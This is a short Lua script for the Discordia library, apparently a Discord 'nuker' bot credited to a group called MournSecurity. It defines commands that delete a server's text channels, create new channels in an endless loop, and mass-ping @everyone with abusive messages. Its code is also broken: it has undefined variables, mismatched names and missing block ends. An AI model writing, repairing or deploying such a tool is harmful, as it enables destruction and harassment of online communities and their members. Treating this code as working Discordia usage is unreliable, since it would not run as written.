-- This script was made by Xao, hail MournSecurity!!

local discordia = require('discordia')
local client = discordia.Client()
local content = message.content
local member = message.author
local memberid = message.author.id

if message.author == client.user then return end
if not message.guild then return end
if message.author.bot then return end
    
local args = message.content:split('%s+')
local cmd = table.remove(args, 1)

--This is where the fun begins :)

print("██╗  ██╗███████╗██╗     ██╗")     
print("██║  ██║██╔════╝██║     ██║")     
print("███████║█████╗  ██║     ██║")     
print("██╔══██║██╔══╝  ██║     ██║")     
print("██║  ██║███████╗███████╗███████╗")
print("╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
print("Made By Xao")

    
    if (cmd=="$deletechannels") then
        for textChannel in guild.textChannel:findAll(fn) do
            print("[+] Deleted", guild.textChannel, " [+]")
            delete()
    end

    if(cmd=="$spamchannels") then
        while true do
            Guild:createTextChannel("get shat on by mournsec")
    end
end
    if(cmd=="$nuke") then
        for textChannel in guild.textChannel:findAll(fn) do
            print("[+] Deleted", guild.textChannel, " [+]")
            delete()
        while true do
            Guild:createTextChannel("get shat on by mournsec")
    end

    if(cmd=="$massping") then
        for textChannel in guild.textChannel:findAll(fn) do
            moveDown(1)
            send("@everyone get fucked by mournsec!")
        end


client:run("token")
